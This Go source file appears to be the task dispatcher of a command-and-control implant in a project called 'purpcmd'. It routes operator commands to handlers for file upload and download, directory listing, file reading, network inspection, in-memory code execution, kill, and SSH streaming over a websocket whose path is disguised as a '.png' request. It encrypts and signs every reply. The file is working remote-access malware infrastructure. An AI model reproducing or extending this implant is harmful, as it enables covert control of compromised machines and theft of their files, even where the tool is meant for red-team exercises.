package core

import (
	"encoding/base64"
	"fmt"

	"purpcmd/implant/ssh"
	"purpcmd/internal"
)

// ExecuteTask dispatches a decoded protocol task through the same command
// handlers for reverse and bind transports. The returned string is an
// authenticated, encrypted, base64-encoded RSP or CHU packet.
func ExecuteTask(ctx *CommandContext, code uint16, payload []byte, taskID [8]byte) (response string, terminate bool, err error) {
	defer func() {
		if recovered := recover(); recovered != nil {
			response = encodeCommandResponse(ctx, taskID, fmt.Sprintf("task %d failed: %v", code, recovered))
			terminate = false
			err = fmt.Errorf("task %d panicked: %v", code, recovered)
		}
	}()

	switch code {
	case internal.PING:
		return HandlePing(ctx, payload, taskID), false, nil
	case internal.SSH:
		if !ctx.AllowReverseStreams || ctx.HTTP == nil {
			return encodeCommandResponse(ctx, taskID, "SSH streaming is unavailable in bind mode"), false, nil
		}
		ssh.Wsclient("aaa", "/any.png?stream="+string(payload), ctx.HTTP.Socket)
		return "", false, nil
	case internal.DOWN:
		return HandleDownload(ctx, payload, taskID), false, nil
	case internal.UPL:
		return HandleUpload(ctx, payload, taskID), false, nil
	case internal.KILL:
		return "", true, nil
	case internal.CD:
		return HandleCD(ctx, payload, taskID), false, nil
	case internal.PWD:
		return HandlePWD(ctx, taskID), false, nil
	case internal.LS:
		return HandleLS(ctx, payload, taskID), false, nil
	case internal.MEMEXEC:
		return HandleMEMEXEC(ctx, payload, taskID), false, nil
	case internal.IFCONFIG:
		return HandleIFCONFIG(ctx, taskID), false, nil
	case internal.CAT:
		return HandleCAT(ctx, payload, taskID), false, nil
	default:
		return encodeCommandResponse(ctx, taskID, fmt.Sprintf("unsupported task code %d", code)), false, nil
	}
}

func encodeCommandResponse(ctx *CommandContext, taskID [8]byte, message string) string {
	packet := PackResponse(ctx.Implant, []byte(message), taskID)
	encrypted := ctx.Encrypt.AESCbcEncrypt(packet)
	ctx.Encrypt.HMACPackAddHmac(&encrypted)
	return base64.StdEncoding.EncodeToString(encrypted)
}
